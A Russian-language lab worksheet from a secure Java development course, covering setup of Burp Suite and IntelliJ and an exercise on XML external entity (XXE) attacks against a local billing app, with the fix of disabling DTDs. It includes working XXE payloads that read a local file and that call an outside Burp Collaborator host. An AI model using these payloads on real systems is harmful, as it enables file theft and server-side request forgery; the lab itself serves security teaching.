# Лабораторный практикум "Безопасная разработка ПО: Прикладной курс Java"

## Содержание
1. [Настройка окружения](#environment)
2. [Обработка XML](#xxe)

## <a name="environment"></a>Настройка окружения
### Настройка Burp Suite и Firefox
1. Установить Firefox (<https://www.mozilla.org/ru/firefox/>)
2. Скачать Burp Suite Community Edition JAR file
(<https://portswigger.net/burp/communitydownload>)
3. Запустить Burp Suite
 (<https://support.portswigger.net/customer/portal/articles/1783038-Installing_Launching%20Burp.html>)
4. Сконфигурировать Firefox для работы с Burp
(<https://support.portswigger.net/customer/portal/articles/1783055-Installing_Configuring%20your%20Browser.html>)
5. Уберите _localhost_ и _127.0.0.1_ из списка адресов, на которые браузер
заходит без прокси

### Настройка IntelliJ IDEA
1. Скачать и установить IntelliJ IDEA Community Edition
(https://www.jetbrains.com/idea/download/)
2. Открыть в IntelliJ IDEA папку с проектом training_java_security_deep_dive

## <a name="xxe"></a>Задание №1. Обработка XML
### Описание
Одной из наиболее распространенных атак на приложения, обрабатывающие XML,
является внедрение внешних XML сущностей (XML eXternal Entity - XXE).
Эта атака возникает при обработке плохо сконфигурированными парсерами
XML-документов, содержащих ссылки на внешние сущности.
### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-01-xxe_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Посмотрите пример счёта (bill_example.xml). _Какую структуру счёта ожидает
приложение?_
4. Загрузите счёт в приложение через форму (http://localhost:8091/bill).
_Как происходит обработка счёта?_
5. Запустите Unit-тесты. Проанализируйте результаты их выполнения.

#### Часть 2. Внедрение внешних сущностей XML
1. _Что такое DTD (Document Type Defenition)?
Как можно определить DTD внутри XML-документа?_
2. Определите XML-сущность в документе счёта. Загрузите сформированный
счёт в приложение. _Что произошло?_
```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe "XXE Vulnerability Test"> ]>
<bill>
    <product id="28">
        <name>&xxe;</name>
        <quantity>1</quantity>
        <price>1337</price>
    </product>
</bill>
```
3. _Что такое внещние XML-сущности (eXternal XML Entities)?_
4. Создайте файл C:\\TEMP\\secret.txt. Определите внешнюю XML-сущность в
документе так, чтобы можно было прочитать этот файл. Загрузите сформированный
счёт в приложение. _Что произошло?_
```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE product [ <!ELEMENT product ANY >
    <!ENTITY xxe SYSTEM "file:////C:\\TEMP\\secret.txt"> ]>
<bill>
    <product id="28">
      <name>&xxe;</name>
      <quantity>77</quantity>
      <price>31337</price>
    </product>
</bill>
```
5. _Какие возможности это открывает перед атакующим?_

#### Часть 3. Предотвращение уязвимостей XXE
1. Откройте _BillPrintingController_. Найдите участок кода, отвечающий за
обработку счетов. _Как происходит обработка XML в приложении?_
2. Отключите поддержку DTD (и, соответсвенно, поддержку внешних сущностей).
```Java
DocumentBuilderFactory dbfactory = DocumentBuilderFactory.newInstance();
dbfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
3. Загрузите в приложение счёт с XXE. _Что произошло?_
4. Запустите Unit-тесты. Проанализируйте результаты их выполнения. Проверьте,
что счета без внешних сущностей обрабатываются корректно.

### Дополнительные задания
#### Часть 4. Расширенная эксплуатация XXE
1. Верните поддержку DTD в приложении.
2. Определите внешнюю сущность так, чтобы можно было обратиться к внутреннему
серверу.  _Что произошло?_
```XML
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE product [ <!ELEMENT product ANY >
    <!ENTITY xxe SYSTEM "http://gyiv38a8htdpb0m9zfr7w95tkkqaez.burpcollaborator.net"> ]>
<bill>
    <product id="28">
      <name>&xxe;</name>
      <quantity>77</quantity>
      <price>31337</price>
    </product>
</bill>
```
3. _Какие возможности это открывает перед атакующим?_
